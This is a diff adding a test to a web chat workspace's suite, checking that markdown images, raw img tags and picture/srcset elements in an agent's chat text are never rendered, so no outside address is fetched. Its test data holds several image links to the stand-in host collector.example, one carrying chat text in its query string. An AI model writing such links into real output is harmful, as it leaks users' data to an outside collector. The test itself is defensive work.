@@ -179,6 +179,33 @@ describe('the session workspace', () => {
     expect(await axeViolations(document.body)).toEqual([]);
   });
 
+  it('never draws a picture the agent writes in the chat, so no address is fetched', async () => {
+    const s = await open();
+    await waitFor(() => expect(screen.getByRole('button', { name: 'Send' })).toBeTruthy());
+    await send(s);
+    act(() =>
+      s.emit({
+        type: 'text',
+        text: [
+          'Done. ![the lesson](https://collector.example/p.png?d=Rebase%20first)',
+          '![][ref] <img src="https://collector.example/raw.png">',
+          '',
+          '<picture><source srcset="https://collector.example/set.png"></picture>',
+          '',
+          '[ref]: https://collector.example/ref.png',
+        ].join('\n'),
+      }),
+    );
+    const chat = screen.getByRole('log', { name: 'Chat with the agent' });
+    await within(chat).findByText(/Done\./);
+    expect(chat.querySelector('img')).toBeNull();
+    expect(document.querySelector('img[src*="collector.example"]')).toBeNull();
+    // Raw HTML is never markup: it stays words, so nothing in the chat carries an address.
+    expect(chat.querySelector('[src], [srcset], picture, source, video, audio, iframe')).toBeNull();
+    // The picture's words stay, as words.
+    expect(within(chat).getByText('the lesson')).toBeTruthy();
+  });
+
   it('undoes the newest turn only after a confirmation', async () => {
     const s = await open();
     await waitFor(() => expect(box().value).toBe('Simplify the basics.'));
